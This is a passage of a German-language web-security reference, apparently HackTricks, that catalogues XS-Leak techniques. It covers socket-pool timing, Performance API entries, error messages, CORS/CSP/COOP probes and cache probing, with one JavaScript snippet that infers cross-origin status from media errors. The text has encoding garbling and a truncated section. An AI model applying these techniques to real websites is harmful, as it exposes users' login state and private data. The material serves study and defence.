3. Verwenden Sie den 256. Socket, um eine Anfrage an die Zielwebseite zu senden.
4. Versuchen Sie eine 257. Anfrage an einen anderen Host. Da alle Sockets belegt sind (gem√§√ü Schritten 2 und 3), wird diese Anfrage in eine Warteschlange gestellt, bis ein Socket verf√ºgbar wird. Die Verz√∂gerung, bevor diese Anfrage fortgesetzt wird, liefert dem Angreifer Timing-Informationen √ºber die Netzwerkaktivit√§t im Zusammenhang mit dem 256. Socket (dem Socket der Zielwebseite). Diese Schlussfolgerung ist m√∂glich, weil die 255 Sockets aus Schritt 2 immer noch belegt sind, was bedeutet, dass jeder neu verf√ºgbare Socket derjenige sein muss, der aus Schritt 3 freigegeben wurde. Die Zeit, die der 256. Socket ben√∂tigt, um verf√ºgbar zu werden, ist somit direkt mit der Zeit verbunden, die f√ºr die Anfrage an die Zielwebseite ben√∂tigt wird.


Weitere Informationen: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)

### Verbindungs-Pool nach Ziel

* **Einschlussmethoden**: JavaScript-Anfragen
* **Unterscheidbare Unterschiede**: Timing (in der Regel aufgrund des Seiteninhalts, des Statuscodes)
* **Weitere Informationen**:
* **Zusammenfassung**: Es handelt sich um die vorherige Technik, aber anstelle aller Sockets verwendet Google **Chrome** eine Begrenzung von **6 gleichzeitigen Anfragen an dieselbe Quelle**. Wenn wir **5 blockieren** und dann eine **6. Anfrage** starten, k√∂nnen wir sie **timen** und wenn es uns gelingt, die **Opferseite dazu zu bringen**, mehr **Anfragen** an denselben Endpunkt zu senden, um den **Status** der **Seite** zu erkennen, wird die **6. Anfrage** l√§nger dauern und wir k√∂nnen dies erkennen.
## Performance-API-Techniken

Die [`Performance-API`](https://developer.mozilla.org/en-US/docs/Web/API/Performance) bietet Einblicke in die Leistungsmetriken von Webanwendungen, die durch die [`Resource Timing API`](https://developer.mozilla.org/en-US/docs/Web/API/Resource_Timing_API) weiter angereichert werden. Die Resource Timing API erm√∂glicht die √úberwachung detaillierter Netzwerkanforderungszeiten, wie z.B. der Dauer der Anforderungen. Insbesondere wenn Server in ihren Antworten den Header `Timing-Allow-Origin: *` enthalten, stehen zus√§tzliche Daten wie die √úbertragungsgr√∂√üe und die Domain-Lookup-Zeit zur Verf√ºgung.

Diese F√ºlle an Daten kann √ºber Methoden wie [`performance.getEntries`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntries) oder [`performance.getEntriesByName`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntriesByName) abgerufen werden, um einen umfassenden √úberblick √ºber leistungsbezogene Informationen zu erhalten. Dar√ºber hinaus erm√∂glicht die API die Messung von Ausf√ºhrungszeiten, indem sie die Differenz zwischen Zeitstempeln berechnet, die von [`performance.now()`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) erhalten wurden. Es ist jedoch zu beachten, dass die Genauigkeit von `performance.now()` f√ºr bestimmte Operationen in Browsern wie Chrome auf Millisekunden beschr√§nkt sein kann, was die Granularit√§t von Zeitmessungen beeinflussen kann.

√úber Zeitmessungen hinaus kann die Performance-API f√ºr sicherheitsrelevante Erkenntnisse genutzt werden. Zum Beispiel kann die Anwesenheit oder Abwesenheit von Seiten im `performance`-Objekt in Chrome auf die Anwendung von `X-Frame-Options` hinweisen. Insbesondere wenn eine Seite aufgrund von `X-Frame-Options` daran gehindert wird, in einem Frame gerendert zu werden, wird sie nicht im `performance`-Objekt erfasst, was einen subtilen Hinweis auf die Framing-Richtlinien der Seite liefert.

### Fehlerleck

* **Einbindungsmethoden**: Frames, HTML-Elemente
* **Nachweisbarer Unterschied**: Statuscode
* **Weitere Informationen**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Zusammenfassung:** Eine Anforderung, die zu Fehlern f√ºhrt, erstellt keinen Ressourcenzeit-Eintrag.
* **Codebeispiel**: [https://xsinator.com/testing.html#Performance%20API%20Error%20Leak](https://xsinator.com/testing.html#Performance%20API%20Error%20Leak)

Es ist m√∂glich, **zwischen HTTP-Antwortstatuscodes zu unterscheiden**, da Anfragen, die zu einem **Fehler** f√ºhren, keinen **Performance-Eintrag** erstellen.

### Style-Reload-Fehler

* **Einbindungsmethoden**: HTML-Elemente
* **Nachweisbarer Unterschied**: Statuscode
* **Weitere Informationen**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Zusammenfassung:** Aufgrund eines Browserfehlers werden Anfragen, die zu Fehlern f√ºhren, zweimal geladen.
* **Codebeispiel**: [https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak](https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak)

In der vorherigen Technik wurden auch zwei F√§lle identifiziert, in denen Browserfehler im GC dazu f√ºhren, dass **Ressourcen zweimal geladen werden, wenn sie nicht geladen werden k√∂nnen**. Dies f√ºhrt zu mehreren Eintr√§gen in der Performance-API und kann daher erkannt werden.

### Anforderungszusammenf√ºhrungsfehler

* **Einbindungsmethoden**: HTML-Elemente
* **Nachweisbarer Unterschied**: Statuscode
* **Weitere Informationen**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Zusammenfassung:** Anfragen, die zu einem Fehler f√ºhren, k√∂nnen nicht zusammengef√ºhrt werden.
* **Codebeispiel**: [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

Die Technik wurde in einer Tabelle in dem genannten Papier gefunden, aber es wurde keine Beschreibung der Technik gefunden. Sie k√∂nnen jedoch den Quellcode √ºberpr√ºfen, um dies unter [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak) herauszufinden.

### Leck von leeren Seiten

* **Einbindungsmethoden**: Frames
* **Nachweisbarer Unterschied**: Seiteninhalt
* **Weitere Informationen**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Zusammenfassung:** Leere Antworten erstellen keine Ressourcenzeit-Eintr√§ge.
* **Codebeispiel**: [https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak](https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak)

Ein Angreifer kann erkennen, ob eine Anforderung zu einem leeren HTTP-Antwortk√∂rper gef√ºhrt hat, da **leere Seiten in einigen Browsern keinen Performance-Eintrag erstellen**.

### **XSS-Auditor-Leck**

* **Einbindungsmethoden**: Frames
* **Nachweisbarer Unterschied**: Seiteninhalt
* **Weitere Informationen**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Zusammenfassung:** Mit dem XSS-Auditor in Security Assertions k√∂nnen Angreifer bestimmte Webseitenelemente erkennen, indem sie Ver√§nderungen in den Antworten beobachten, wenn speziell erstellte Payloads den Filtermechanismus des Auditors ausl√∂sen.
* **Codebeispiel**: [https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak](https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak)

In Security Assertions (SA) kann der XSS-Auditor, der urspr√ºnglich dazu gedacht war, Cross-Site Scripting (XSS)-Angriffe zu verhindern, paradoxerweise dazu genutzt werden, sensible Informationen preiszugeben. Obwohl dieses integrierte Feature aus Google Chrome (GC) entfernt wurde, ist es in SA immer noch vorhanden. Im Jahr 2013 zeigten Braun und Heiderich, dass der XSS-Auditor versehentlich legitime Skripte blockieren konnte, was zu falsch positiven Ergebnissen f√ºhrte. Aufbauend darauf entwickelten Forscher Techniken, um Informationen zu extrahieren und bestimmte Inhalte auf Cross-Origin-Seiten zu erkennen, ein Konzept, das als XS-Leaks bekannt ist, das urspr√ºnglich von Terada gemeldet und von Heyes in einem Blogbeitrag erl√§utert wurde. Obwohl diese Techniken spezifisch f√ºr den XSS-Auditor in GC waren, wurde festgestellt, dass in SA blockierte Seiten des XSS-Auditors keine Eintr√§ge in der Performance-API generieren, was eine Methode zur m√∂glichen Leckage sensibler Informationen aufzeigt.

### X-Frame-Leck

* **Einbindungsmethoden**: Frames
* **Nachweisbarer Unterschied**: Header
* **Weitere Informationen**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2), [https://xsleaks.github.io/xsleaks/examples/x-frame/index.html](https://xsleaks.github.io/xsleaks/examples/x-frame/index.html), [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options)
* **Zusammenfassung:** Eine Ressource mit dem X-Frame-Options-Header erstellt keinen Ressourcenzeit-Eintrag.
* **Codebeispiel**: [https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak](https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak)

Wenn eine Seite **nicht in einem iframe** gerendert werden darf, erstellt sie keinen Performance-Eintrag. Dadurch kann ein Angreifer den Antwortheader **`X-Frame-Options`** erkennen.\
Gleiches gilt, wenn Sie ein **embed**-Tag verwenden.

### Download-Erkennung

* **Einbindungsmethoden**: Frames
* **Nachweisbarer Unterschied**: Header
* **Weitere Informationen**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Zusammenfassung:** Downloads erstellen keine Ressourcenzeit-Eintr√§ge in der Performance-API.
* **Codebeispiel**: [https://xsinator.com/testing.html#Performance%20API%20Download%20Detection](https://xsinator.com/testing.html#Performance%20API%20Download%20Detection)

√Ñ
### Weiterleitung Start Leck

* **Inklusionsmethoden**: Frames
* **Nachweisbarer Unterschied**: Weiterleitung
* **Weitere Informationen**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Zusammenfassung**: Der Ressourcenzeitpunkt gibt den Startzeitpunkt einer Weiterleitung preis.
* **Codebeispiel**: [https://xsinator.com/testing.html#Redirect%20Start%20Leak](https://xsinator.com/testing.html#Redirect%20Start%20Leak)

Wir haben eine XS-Leak-Instanz gefunden, die das Verhalten einiger Browser ausnutzt, die zu viele Informationen f√ºr Cross-Origin-Anfragen protokollieren. Der Standard definiert eine Teilmenge von Attributen, die f√ºr Cross-Origin-Ressourcen auf Null gesetzt werden sollten. In **SA** ist es jedoch m√∂glich, festzustellen, ob der Benutzer von der Zielseite **weitergeleitet** wird, indem die **Performance API** abgefragt und die **redirectStart Timing-Daten** √ºberpr√ºft werden.

### Dauer Weiterleitung Leck

* **Inklusionsmethoden**: Fetch API
* **Nachweisbarer Unterschied**: Weiterleitung
* **Weitere Informationen**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Zusammenfassung**: Die Dauer von Zeitangaben ist negativ, wenn eine Weiterleitung erfolgt.
* **Codebeispiel**: [https://xsinator.com/testing.html#Duration%20Redirect%20Leak](https://xsinator.com/testing.html#Duration%20Redirect%20Leak)

In GC ist die **Dauer** f√ºr Anfragen, die zu einer **Weiterleitung** f√ºhren, **negativ** und kann somit von Anfragen unterschieden werden, die nicht zu einer Weiterleitung f√ºhren.

### CORP-Leck

* **Inklusionsmethoden**: Frames
* **Nachweisbarer Unterschied**: Header
* **Weitere Informationen**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Zusammenfassung**: Ressourcen, die mit CORP gesch√ºtzt sind, erzeugen keine Ressourcenzeitangaben.
* **Codebeispiel**: [https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak](https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak)

In einigen F√§llen kann der **nextHopProtocol-Eintrag** als Lecktechnik verwendet werden. In GC wird der nextHopProtocol-Eintrag leer sein, wenn der **CORP-Header** gesetzt ist. Beachten Sie, dass SA f√ºr CORP-f√§hige Ressourcen √ºberhaupt keinen Leistungseintrag erstellt.

### Service Worker

* **Inklusionsmethoden**: Frames
* **Nachweisbarer Unterschied**: API-Nutzung
* **Weitere Informationen**: [https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/](https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/)
* **Zusammenfassung**: Ermitteln Sie, ob ein Service Worker f√ºr einen bestimmten Ursprung registriert ist.
* **Codebeispiel**:

Service Worker sind ereignisgesteuerte Skriptkontexte, die an einem Ursprung ausgef√ºhrt werden. Sie laufen im Hintergrund einer Webseite und k√∂nnen Ressourcen abfangen, modifizieren und **zwischenspeichern**, um eine Offline-Webanwendung zu erstellen.\
Wenn eine vom Service Worker zwischengespeicherte Ressource √ºber ein **iframe** abgerufen wird, wird die Ressource aus dem Service Worker-Cache geladen.\
Um festzustellen, ob die Ressource aus dem Service Worker-Cache geladen wurde, kann die **Performance API** verwendet werden.\
Dies k√∂nnte auch mit einem Timing-Angriff durchgef√ºhrt werden (weitere Informationen finden Sie im Paper).

### Cache

* **Inklusionsmethoden**: Fetch API
* **Nachweisbarer Unterschied**: Zeitangabe
* **Weitere Informationen**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources)
* **Zusammenfassung**: Es ist m√∂glich zu √ºberpr√ºfen, ob eine Ressource im Cache gespeichert ist.
* **Codebeispiel**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources), [https://xsinator.com/testing.html#Cache%20Leak%20(POST)](https://xsinator.com/testing.html#Cache%20Leak%20\(POST\))

Mit der [Performance API](xs-search.md#performance-api) ist es m√∂glich zu √ºberpr√ºfen, ob eine Ressource zwischengespeichert ist.

### Netzwerkdauer

* **Inklusionsmethoden**: Fetch API
* **Nachweisbarer Unterschied**: Seiteninhalt
* **Weitere Informationen**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)
* **Zusammenfassung**: Es ist m√∂glich, die Netzwerkdauer einer Anfrage aus der `performance` API abzurufen.
* **Codebeispiel**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)

## Fehlermeldungen-Technik

### Medienfehler

* **Inklusionsmethoden**: HTML-Elemente (Video, Audio)
* **Nachweisbarer Unterschied**: Statuscode
* **Weitere Informationen**: [https://bugs.chromium.org/p/chromium/issues/detail?id=828265](https://bugs.chromium.org/p/chromium/issues/detail?id=828265)
* **Zusammenfassung**: In Firefox ist es m√∂glich, den Statuscode einer Cross-Origin-Anfrage genau preiszugeben.
* **Codebeispiel**: [https://jsbin.com/nejatopusi/1/edit?html,css,js,output](https://jsbin.com/nejatopusi/1/edit?html,css,js,output)
```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
window.addEventListener("load", startup, false);
function displayErrorMessage(msg) {
document.getElementById("log").innerHTML += msg;
}

function startup() {
let audioElement = document.getElementById("audio");
// "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
document.getElementById("startTest").addEventListener("click", function() {
audioElement.src = document.getElementById("testUrl").value;
}, false);
// Create the event handler
var errHandler = function() {
let err = this.error;
let message = err.message;
let status = "";

// Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
// Firefox error.message when the request loads successfully: "Failed to init decoder"
if((message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1) || (message.indexOf("Failed to init decoder") != -1)){
status = "Success";
}else{
status = "Error";
}
displayErrorMessage("<strong>Status: " + status + "</strong> (Error code:" + err.code + " / Error Message: " + err.message + ")<br>");
};
audioElement.onerror = errHandler;
}
```
Die Eigenschaft `message` des `MediaError`-Interfaces identifiziert Ressourcen, die erfolgreich geladen werden, mit einem eindeutigen String. Ein Angreifer kann diese Funktion ausnutzen, indem er den Inhalt der Nachricht beobachtet und so den Antwortstatus einer Ressource mit Cross-Origin ableitet.

### CORS-Fehler

* **Einschlussmethoden**: Fetch API
* **Nachweisbarer Unterschied**: Header
* **Weitere Informationen**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Zusammenfassung**: Bei Sicherheitsaussagen (SA) geben CORS-Fehlermeldungen versehentlich die vollst√§ndige URL von umgeleiteten Anfragen preis.
* **Codebeispiel**: [https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

Diese Technik erm√∂glicht es einem Angreifer, das Ziel einer Umleitung einer Cross-Origin-Site zu extrahieren, indem er ausnutzt, wie Webkit-basierte Browser CORS-Anfragen behandeln. Konkret wird, wenn eine CORS-f√§hige Anfrage an eine Zielseite gesendet wird, die basierend auf dem Benutzerstatus eine Umleitung ausgibt und der Browser die Anfrage anschlie√üend ablehnt, die vollst√§ndige URL des Umleitungsziels in der Fehlermeldung offengelegt. Diese Sicherheitsl√ºcke enth√ºllt nicht nur die Tatsache der Umleitung, sondern auch das Endpunkt der Umleitung und eventuelle sensible Abfrageparameter.

### SRI-Fehler

* **Einschlussmethoden**: Fetch API
* **Nachweisbarer Unterschied**: Header
* **Weitere Informationen**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Zusammenfassung**: Bei Sicherheitsaussagen (SA) geben CORS-Fehlermeldungen versehentlich die vollst√§ndige URL von umgeleiteten Anfragen preis.
* **Codebeispiel**: [https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

Ein Angreifer kann **ausf√ºhrliche Fehlermeldungen** nutzen, um die Gr√∂√üe von Cross-Origin-Antworten abzuleiten. Dies ist auf den Mechanismus der Subresource Integrity (SRI) zur√ºckzuf√ºhren, der das Integrit√§tsattribut verwendet, um zu √ºberpr√ºfen, ob Ressourcen, die h√§ufig von CDNs abgerufen werden, nicht manipuliert wurden. Damit SRI bei Cross-Origin-Ressourcen funktioniert, m√ºssen diese **CORS-f√§hig** sein, ansonsten unterliegen sie keiner Integrit√§tspr√ºfung. Bei Sicherheitsaussagen (SA) kann, √§hnlich wie beim CORS-Fehler XS-Leak, eine Fehlermeldung erfasst werden, nachdem eine Fetch-Anfrage mit einem Integrit√§tsattribut fehlschl√§gt. Angreifer k√∂nnen diesen Fehler absichtlich ausl√∂sen, indem sie einen **falschen Hash-Wert** dem Integrit√§tsattribut einer beliebigen Anfrage zuweisen. Bei SA enth√ºllt die resultierende Fehlermeldung versehentlich die L√§nge des angeforderten Ressourceninhalts. Diese Informationslecks erm√∂glichen es einem Angreifer, Variationen in der Antwortgr√∂√üe zu erkennen und so anspruchsvolle XS-Leak-Angriffe durchzuf√ºhren.

### CSP-Versto√ü/Detektion

* **Einschlussmethoden**: Pop-ups
* **Nachweisbarer Unterschied**: Statuscode
* **Weitere Informationen**: [https://bugs.chromium.org/p/chromium/issues/detail?id=313737](https://bugs.chromium.org/p/chromium/issues/detail?id=313737), [https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html](https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html), [https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)
* **Zusammenfassung**: Wenn in der CSP nur die Website des Opfers zugelassen wird und versucht wird, auf eine andere Domain umzuleiten, l√∂st die CSP einen nachweisbaren Fehler aus.
* **Codebeispiel**: [https://xsinator.com/testing.html#CSP%20Violation%20Leak](https://xsinator.com/testing.html#CSP%20Violation%20Leak), [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation)

Ein XS-Leak kann die CSP nutzen, um festzustellen, ob eine Cross-Origin-Site auf eine andere Herkunft umgeleitet wurde. Dieses Leck kann die Umleitung erkennen, aber zus√§tzlich wird die Domain des Umleitungsziels preisgegeben. Die Grundidee dieses Angriffs besteht darin, **die Ziel-Domain auf der Angreiferseite zuzulassen**. Sobald eine Anfrage an die Ziel-Domain gestellt wird, erfolgt eine Umleitung auf eine Cross-Origin-Domain. Die CSP **blockiert den Zugriff darauf** und erstellt einen **Versto√übericht, der als Lecktechnik verwendet wird**. Je nach Browser kann dieser Bericht die Zielposition der Umleitung preisgeben.\
Moderne Browser geben nicht die URL an, zu der umgeleitet wurde, aber es ist dennoch m√∂glich festzustellen, dass eine Cross-Origin-Umleitung ausgel√∂st wurde.

### Cache

* **Einschlussmethoden**: Frames, Pop-ups
* **Nachweisbarer Unterschied**: Seitenelemente
* **Weitere Informationen**: [https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events](https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events), [https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html](https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html)
* **Zusammenfassung**: L√∂schen Sie die Datei aus dem Cache. √ñffnen Sie die Zielseite und pr√ºfen Sie, ob die Datei im Cache vorhanden ist.
* **Codebeispiel:**

Browser k√∂nnen einen gemeinsamen Cache f√ºr alle Websites verwenden. Unabh√§ngig von ihrer Herkunft ist es m√∂glich festzustellen, ob eine Zielseite eine bestimmte Datei angefordert hat.

Wenn eine Seite ein Bild nur l√§dt, wenn der Benutzer angemeldet ist, k√∂nnen Sie die **Ressource ung√ºltig machen** (damit sie nicht mehr im Cache ist, falls sie es war, siehe weitere Informationen), eine Anfrage durchf√ºhren, die diese Ressource laden k√∂nnte, und versuchen, die Ressource **mit einer fehlerhaften Anfrage** zu laden (z. B. mit einem √ºberlangen Referer-Header). Wenn der Ressourcenabruf **keinen Fehler ausl√∂st**, liegt das daran, dass sie **im Cache** war.

### CSP-Direktive

* **Einschlussmethoden**: Frames
* **Nachweisbarer Unterschied**: Header
* **Weitere Informationen**: [https://bugs.chromium.org/p/chromium/issues/detail?id=1105875](https://bugs.chromium.org/p/chromium/issues/detail?id=1105875)
* **Zusammenfassung**: CSP-Header-Direktiven k√∂nnen mit dem CSP-Iframe-Attribut gepr√ºft werden, um Details zur Richtlinie preiszugeben.
* **Codebeispiel**: [https://xsinator.com/testing.html#CSP%20Directive%20Leak](https://xsinator.com/testing.html#CSP%20Directive%20Leak)

Ein neuartiges Feature in Google Chrome (GC) erm√∂glicht es Webseiten, eine Content Security Policy (CSP) vorzuschlagen, indem sie ein Attribut auf einem iframe-Element setzen, wobei die Richtliniendirektiven zusammen mit der HTTP-Anfrage √ºbertragen werden. Normalerweise muss der eingebettete Inhalt dies √ºber einen HTTP-Header **autorisieren**, sonst wird eine **Fehlerseite angezeigt**. Wenn das iframe jedoch bereits von einer CSP geregelt wird und die neu vorgeschlagene Richtlinie nicht restriktiver ist, wird die Seite normal geladen. Dieser Mechanismus er√∂ffnet einem Angreifer die M√∂glichkeit, **bestimmte CSP-Direktiven** einer Cross-Origin-Seite zu erkennen, indem er die Fehlerseite identifiziert. Obwohl diese Sicherheitsl√ºcke als behoben markiert wurde, zeigen unsere Ergebnisse eine **neue Lecktechnik**, die in der Lage ist, die Fehlerseite zu erkennen, was darauf hindeutet, dass das zugrunde liegende Problem nie vollst√§ndig behoben wurde.

### **CORP**

* **Einschlussmethoden**: Fetch API
* **Nachweisbarer Unterschied**: Header
* **Weitere Informationen**: [**https://xsleaks.dev/docs/attacks/browser-features/corp/**](https://xsleaks.dev/docs/attacks/browser-features/corp/)
* **Zusammenfassung**: Ressourcen, die mit Cross-Origin Resource Policy (CORP) gesichert sind, werfen einen Fehler aus, wenn sie von einer
### CORB

* **Inclusion Methods**: HTML-Elemente
* **Erkennbarer Unterschied**: Header
* **Weitere Informationen**: [https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header](https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header)
* **Zusammenfassung**: CORB erm√∂glicht es Angreifern, festzustellen, ob der **`nosniff`-Header** in der Anfrage vorhanden ist.
* **Codebeispiel**: [https://xsinator.com/testing.html#CORB%20Leak](https://xsinator.com/testing.html#CORB%20Leak)

√úberpr√ºfen Sie den Link f√ºr weitere Informationen √ºber den Angriff.

### CORS-Fehler bei Fehlkonfiguration der Origin-Reflexion <a href="#cors-error-on-origin-reflection-misconfiguration" id="cors-error-on-origin-reflection-misconfiguration"></a>

* **Inclusion Methods**: Fetch API
* **Erkennbarer Unterschied**: Header
* **Weitere Informationen**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)
* **Zusammenfassung**: Wenn der Origin-Header im Header `Access-Control-Allow-Origin` reflektiert wird, ist es m√∂glich zu √ºberpr√ºfen, ob eine Ressource bereits im Cache vorhanden ist.
* **Codebeispiel**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)

Falls der **Origin-Header** im Header `Access-Control-Allow-Origin` **reflektiert** wird, kann ein Angreifer dieses Verhalten ausnutzen, um zu versuchen, die Ressource im **CORS-Modus** abzurufen. Wenn kein Fehler ausgel√∂st wird, bedeutet dies, dass die Ressource **korrekt aus dem Web abgerufen wurde**. Wenn ein Fehler ausgel√∂st wird, bedeutet dies, dass sie aus dem **Cache abgerufen wurde** (der Fehler tritt auf, weil der Cache eine Antwort mit einem CORS-Header speichert, der die urspr√ºngliche Domain und nicht die Domain des Angreifers erlaubt). Beachten Sie, dass dies nicht funktioniert, wenn der Origin nicht reflektiert wird, sondern ein Platzhalter verwendet wird (`Access-Control-Allow-Origin: *`).

## Technik der lesbaren Attribute

### Fetch-Umleitung

* **Inclusion Methods**: Fetch API
* **Erkennbarer Unterschied**: Statuscode
* **Weitere Informationen**: [https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html)
* **Zusammenfassung**: GC und SA erm√∂glichen es, den Typ der Antwort (`opaque-redirect`) nach Abschluss der Umleitung zu √ºberpr√ºfen.
* **Codebeispiel**: [https://xsinator.com/testing.html#Fetch%20Redirect%20Leak](https://xsinator.com/testing.html#Fetch%20Redirect%20Leak)

Durch das Senden einer Anfrage mit der Fetch API und `redirect: "manual"` sowie anderen Parametern ist es m√∂glich, das Attribut `response.type` auszulesen. Wenn es gleich `opaqueredirect` ist, handelte es sich bei der Antwort um eine Umleitung.

### COOP

* **Inclusion Methods**: Pop-ups
* **Erkennbarer Unterschied**: Header
* **Weitere Informationen**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.4), [https://xsleaks.dev/docs/attacks/window-references/](https://xsleaks.dev/docs/attacks/window-references/)
* **Zusammenfassung**: Seiten, die durch die Cross-Origin Opener Policy (COOP) gesch√ºtzt sind, verhindern den Zugriff durch Cross-Origin-Interaktionen.
* **Codebeispiel**: [https://xsinator.com/testing.html#COOP%20Leak](https://xsinator.com/testing.html#COOP%20Leak)

Ein Angreifer kann das Vorhandensein des Cross-Origin Opener Policy (COOP)-Headers in einer Cross-Origin-HTTP-Antwort erkennen. COOP wird von Webanwendungen verwendet, um zu verhindern, dass externe Websites beliebige Fensterreferenzen erhalten. Die Sichtbarkeit dieses Headers kann festgestellt werden, indem versucht wird, auf die **`contentWindow`-Referenz** zuzugreifen. In F√§llen, in denen COOP bedingt angewendet wird, wird die **`opener`-Eigenschaft** zum Indikator: Sie ist **undefiniert**, wenn COOP aktiv ist, und **definiert**, wenn COOP nicht aktiv ist.

### URL-Maximall√§nge - Serverseitig

* **Inclusion Methods**: Fetch API, HTML-Elemente
* **Erkennbarer Unterschied**: Statuscode / Inhalt
* **Weitere Informationen**: [https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects](https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects)
* **Zusammenfassung**: Unterschiede in den Antworten aufgrund der L√§nge der Umleitungsantwort k√∂nnen dazu f√ºhren, dass der Server einen Fehler zur√ºckgibt und ein Alert generiert wird.
* **Codebeispiel**: [https://xsinator.com/testing.html#URL%20Max%20Length%20Leak](https://xsinator.com/testing.html#URL%20Max%20Length%20Leak)

Wenn eine serverseitige Umleitung **Benutzereingaben in der Umleitung** und **zus√§tzliche Daten** verwendet, ist es m√∂glich, dieses Verhalten zu erkennen, da Server normalerweise eine **Begrenzung der Anforderungsl√§nge** haben. Wenn die **Benutzerdaten** diese **L√§nge - 1** haben, weil die **Umleitung** diese Daten verwendet und **etwas Zus√§tzliches hinzuf√ºgt**, wird ein **Fehler √ºber Error Events** ausgel√∂st.

Wenn Sie einem Benutzer Cookies setzen k√∂nnen, k√∂nnen Sie diesen Angriff auch durchf√ºhren, indem Sie gen√ºgend Cookies setzen ([**Cookie-Bombe**](hacking-with-cookies/cookie-bomb.md)), sodass bei der **korrekten Antwort** die **Gr√∂√üe der Antwort** erh√∂ht wird und ein Fehler ausgel√∂st wird. In diesem Fall beachten Sie, dass bei einer Anfrage von derselben Website `<script>` automatisch die Cookies sendet (damit Sie nach Fehlern suchen k√∂nnen).\
Ein Beispiel f√ºr die **Cookie-Bombe + XS-Search** finden Sie in der beabsichtigten L√∂sung dieses Writeups: [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended)

